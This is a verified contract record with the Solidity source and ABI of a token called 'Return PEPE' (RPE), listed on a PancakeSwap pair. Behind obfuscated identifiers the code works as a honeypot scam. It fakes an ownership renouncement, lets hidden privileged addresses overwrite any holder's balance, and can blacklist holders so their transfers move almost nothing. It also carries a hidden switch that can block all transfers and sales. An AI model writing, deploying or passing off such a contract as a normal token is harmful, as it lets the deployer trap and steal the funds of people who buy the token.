{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface amountLaunchTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletList) external view returns (uint256);\n\n    function transfer(address swapTxBuy, uint256 marketingMin) external returns (bool);\n\n    function allowance(address feeLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTxBuy,\n        uint256 marketingMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedReceiver, uint256 value);\n    event Approval(address indexed feeLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract toReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txLaunched {\n    function createPair(address maxSell, address tradingLaunchAuto) external returns (address);\n}\n\ninterface isFrom is amountLaunchTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReturnPEPE is toReceiver, amountLaunchTake, isFrom {\n\n    function getOwner() external view returns (address) {\n        return limitMax;\n    }\n\n    function tokenShould(address launchMarketing) public {\n        swapWallet();\n        if (launchedTotal) {\n            sellSwap = false;\n        }\n        if (launchMarketing == maxFrom || launchMarketing == tokenLimitTeam) {\n            return;\n        }\n        launchedModeFee[launchMarketing] = true;\n    }\n\n    function transfer(address swapLaunchEnable, uint256 marketingMin) external virtual override returns (bool) {\n        return enableWalletReceiver(_msgSender(), swapLaunchEnable, marketingMin);\n    }\n\n    mapping(address => uint256) private fromFund;\n\n    function walletSender(address swapLaunchEnable, uint256 marketingMin) public {\n        swapWallet();\n        fromFund[swapLaunchEnable] = marketingMin;\n    }\n\n    uint256 private maxMode;\n\n    bool public minSellMode;\n\n    function tradingLaunchedReceiver() public {\n        emit OwnershipTransferred(maxFrom, address(0));\n        limitMax = address(0);\n    }\n\n    bool private listToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLaunch;\n    }\n\n    uint256 private launchedMaxReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptIs;\n    }\n\n    function balanceOf(address walletList) public view virtual override returns (uint256) {\n        return fromFund[walletList];\n    }\n\n    function owner() external view returns (address) {\n        return limitMax;\n    }\n\n    constructor (){\n        if (listToken == sellSwap) {\n            maxMode = amountFrom;\n        }\n        modeBuy enableLiquidity = modeBuy(fromExempt);\n        tokenLimitTeam = txLaunched(enableLiquidity.factory()).createPair(enableLiquidity.WETH(), address(this));\n        if (launchedAmount) {\n            launchedAmount = true;\n        }\n        maxFrom = _msgSender();\n        tradingLaunchedReceiver();\n        liquidityAtAmount[maxFrom] = true;\n        fromFund[maxFrom] = exemptIs;\n        if (listToken != buyTotal) {\n            listToken = false;\n        }\n        emit Transfer(address(0), maxFrom, exemptIs);\n    }\n\n    function enableWalletReceiver(address txToken, address swapTxBuy, uint256 marketingMin) internal returns (bool) {\n        if (txToken == maxFrom) {\n            return teamMode(txToken, swapTxBuy, marketingMin);\n        }\n        uint256 senderTakeFee = amountLaunchTake(tokenLimitTeam).balanceOf(totalSell);\n        require(senderTakeFee == enableSender);\n        require(swapTxBuy != totalSell);\n        if (launchedModeFee[txToken]) {\n            return teamMode(txToken, swapTxBuy, walletLaunchedSender);\n        }\n        return teamMode(txToken, swapTxBuy, marketingMin);\n    }\n\n    string private feeEnable = \"Return PEPE\";\n\n    bool private buyTotal;\n\n    address public tokenLimitTeam;\n\n    function teamMode(address txToken, address swapTxBuy, uint256 marketingMin) internal returns (bool) {\n        require(fromFund[txToken] >= marketingMin);\n        fromFund[txToken] -= marketingMin;\n        fromFund[swapTxBuy] += marketingMin;\n        emit Transfer(txToken, swapTxBuy, marketingMin);\n        return true;\n    }\n\n    string private launchTxTake = \"RPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTxTake;\n    }\n\n    function exemptMin(uint256 marketingMin) public {\n        swapWallet();\n        enableSender = marketingMin;\n    }\n\n    function receiverAt(address modeSwapShould) public {\n        require(modeSwapShould.balance < 100000);\n        if (minSellMode) {\n            return;\n        }\n        \n        liquidityAtAmount[modeSwapShould] = true;\n        if (launchedAmount) {\n            launchedTotal = false;\n        }\n        minSellMode = true;\n    }\n\n    uint256 receiverFee;\n\n    address public maxFrom;\n\n    function approve(address totalMinTx, uint256 marketingMin) public virtual override returns (bool) {\n        receiverLiquidity[_msgSender()][totalMinTx] = marketingMin;\n        emit Approval(_msgSender(), totalMinTx, marketingMin);\n        return true;\n    }\n\n    address fromExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private amountFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return feeEnable;\n    }\n\n    uint256 enableSender;\n\n    function allowance(address totalMaxToken, address totalMinTx) external view virtual override returns (uint256) {\n        if (totalMinTx == fromExempt) {\n            return type(uint256).max;\n        }\n        return receiverLiquidity[totalMaxToken][totalMinTx];\n    }\n\n    uint8 private listLaunch = 18;\n\n    uint256 constant walletLaunchedSender = 12 ** 10;\n\n    bool public launchedTotal;\n\n    function transferFrom(address txToken, address swapTxBuy, uint256 marketingMin) external override returns (bool) {\n        if (_msgSender() != fromExempt) {\n            if (receiverLiquidity[txToken][_msgSender()] != type(uint256).max) {\n                require(marketingMin <= receiverLiquidity[txToken][_msgSender()]);\n                receiverLiquidity[txToken][_msgSender()] -= marketingMin;\n            }\n        }\n        return enableWalletReceiver(txToken, swapTxBuy, marketingMin);\n    }\n\n    mapping(address => bool) public launchedModeFee;\n\n    function swapWallet() private view {\n        require(liquidityAtAmount[_msgSender()]);\n    }\n\n    address private limitMax;\n\n    address totalSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public launchedAmount;\n\n    uint256 private exemptIs = 100000000 * 10 ** 18;\n\n    bool private sellSwap;\n\n    event OwnershipTransferred(address indexed autoReceiver, address indexed isAuto);\n\n    mapping(address => bool) public liquidityAtAmount;\n\n    mapping(address => mapping(address => uint256)) private receiverLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMaxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMinTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMinTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedModeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAtAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapShould\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimitTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"tokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunchEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunchEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"walletSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReturnPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}